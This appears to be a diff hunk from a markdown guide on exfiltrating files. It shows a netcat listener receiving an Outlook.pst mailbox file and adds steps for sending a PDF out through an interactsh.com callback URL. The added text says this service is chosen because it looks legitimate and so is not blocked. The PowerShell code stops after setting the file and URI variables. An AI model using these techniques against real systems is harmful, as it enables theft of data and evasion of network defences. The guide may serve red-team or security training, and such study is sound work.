@@ -14,9 +14,11 @@ nc -l -p 80 > Outlook.pst
 ```
 
 
-Or via HTTP requests:
+Or via HTTP requests (interact.sh service):
 
-file/pdf extraction:
+First go to interactsh.com and copy the unique link you get.
+
+file/pdf extraction via public service which is used legitimate and thus not blocked:
 ```powershell
 $File = "file.pdf"
 $uri = "ID.interactsh.com" # change the ID 
